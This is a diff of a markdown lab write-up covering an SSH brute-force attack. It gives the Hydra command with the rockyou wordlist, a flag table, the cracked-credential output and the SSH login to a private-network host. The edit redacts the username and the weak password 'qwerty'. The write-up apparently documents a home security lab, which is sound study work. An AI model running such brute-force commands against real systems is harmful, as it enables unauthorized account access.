@@ -42,7 +42,7 @@ Network Distance: 1 hop
 
 ## Attack #2 — SSH Brute Force + Initial Access
 
-**Objective:** Crack SSH credentials for user `aegis-siem`, gain shell access.
+**Objective:** Crack SSH credentials for user `user`, gain shell access.
 
 **Tool:** Hydra 9.6  
 **Source:** Kali Laptop (172.20.10.8)  
@@ -50,39 +50,39 @@ Network Distance: 1 hop
 **Wordlist:** `/usr/share/wordlists/rockyou.txt` (14,344,399 entries)
 
 ```bash
-hydra -l aegis-siem -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.20.10.6
+hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.20.10.6
 ```
 
 ### Flag breakdown
 
 | Flag | Description |
 |:-----|:------------|
-| `-l aegis-siem` | Target username |
+| `-l user` | Target username |
 | `-P rockyou.txt` | Password wordlist |
 | `-t 4` | 4 parallel connections |
 
 ### Result
 
 ```
-[22][ssh] host: 172.20.10.6   login: aegis-siem   password: qwerty
+[22][ssh] host: 172.20.10.6   login: user   password: passxxxx
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Password `qwerty` found — position ~491 in rockyou.txt.
+Password `passxxxx` found — position ~491 in rockyou.txt.
 
 ![Hydra — password found and SSH login](05_hydra_first_attempt.png)
 
 ### Initial Access
 
 ```bash
-ssh aegis-siem@172.20.10.6
-# password: qwerty
+ssh user@172.20.10.6
+# password: passxxxx
 ```
 
 ```
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)
 Last login: Sun Mar 22 12:09:06 2026 from 172.20.10.8
-aegis-siem@aegis-sentinel:~$
+user@user:~$
 ```
 
 Attacker successfully logged into aegis-sentinel using compromised credentials.
